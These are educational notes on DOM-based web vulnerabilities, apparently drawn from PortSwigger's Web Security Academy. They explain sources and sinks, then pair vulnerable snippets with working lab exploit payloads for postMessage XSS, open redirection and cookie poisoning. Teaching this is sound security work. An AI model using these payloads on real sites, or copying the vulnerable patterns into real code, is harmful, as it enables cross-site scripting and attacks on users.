# DOM-based vulnerabilities

## **What is the DOM?**

The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties. DOM manipulation in itself is not a problem. In fact, it is an integral part of how modern websites work. However, JavaScript that handles data insecurely can enable various attacks. DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink. 

## **Taint-flow vulnerabilities**

Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data. 

### **What is taint flow?**

**Sources**

A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the `location.search` property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the `document.referrer` string), the user's cookies (exposed by the `document.cookie` string), and web messages.

**Sinks**

A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session. 

### **Common sources**

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities: 

```html
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

The following kinds of data can also be used as sources to exploit taint-flow vulnerabilities:

- [Reflected data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data) LABS
- [Stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data) LABS
- [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source) LABS

## **Which sinks can lead to DOM-based vulnerabilities?**

The following list provides a quick overview of common DOM-based vulnerabilities and an example of a sink that can lead to each one. For a more comprehensive list of relevant sinks, please refer to the vulnerability-specific pages by clicking the links below. 

| DOM-based vulnerability | Example sink |
| --- | --- |
| [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) LABS | `document.write()` |
| [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection) LABS | `window.location` |
| [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) LABS | `document.cookie` |
| [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection) | `eval()` |
| [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation) | `document.domain` |
| [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning) | `WebSocket()` |
| [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation) | `element.src` |
| [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation) | `postMessage()` |
| [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation) | `setRequestHeader()` |
| [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation) | `FileReader.readAsText()` |
| [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection) | `ExecuteSql()` |
| [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation) | `sessionStorage.setItem()` |
| [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection) | `document.evaluate()` |
| [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection) | `JSON.parse()` |
| [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation) | `element.setAttribute()` |
| [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service) | `RegExp()` |

## [**DOM clobbering**](https://portswigger.net/web-security/dom-based/dom-clobbering)

DOM clobbering is an advanced technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the website. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL. 

## Labs

### Web Messages

[**DOM XSS using web messages**](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)

```markdown
# Vulnerable code
<script>
   window.addEventListener('message', function(e) {
      document.getElementById('ads').innerHTML = e.data;
    })
</script>
# Exploit 1 - DOM Invader
# Exploit 2 - iframe HTML code 
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

[**DOM XSS using web messages and a JavaScript URL**](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

```markdown
# Vulnerable code
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
# Exploit 1 - DOM Invader
# Exploit 2 - iframe HTML code
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

[**DOM XSS using web messages and `JSON.parse`**](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)

```markdown
# Vulnerable code
<script>
    window.addEventListener('message', function(e) {
        const iframe = document.createElement('iframe');
        const ACMEplayer = { element: iframe };
        document.body.appendChild(iframe);
        let d;
        try {
            d = JSON.parse(e.data);
        } catch(err) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
# Exploit 1 - DOM Invader
# Exploit 2 - iframe HTML code
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

### Open Redirection

[**DOM-based open redirection**](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)

```markdown
# Vulnerable code
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>

# Exploit URL
https://web-security-academy.net/post?postId=3&url=http://exploit-0a21005f03b78d458060c5e1012f00ce.exploit-server.net
```

### Cookie Manipulation

[**DOM-based cookie manipulation**](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

```markdown
# Vulnerable code
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure';
</script>

# Put the following payload and deliver to the victim
<iframe src="https://web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://web-security-academy.net';window.x=1;">

#  The original source of the iframe matches the URL of one of the product      pages, except there is a JavaScript payload added to the end. When the iframe   loads for the first time, the browser temporarily opens the malicious URL,      which is then saved as the value of the lastViewedProduct cookie. The onload    event handler ensures that the victim is then immediately redirected to the     home page, unaware that this manipulation ever took place. While the victim's   browser has the poisoned cookie saved, loading the home page will cause the     payload to execute. 
```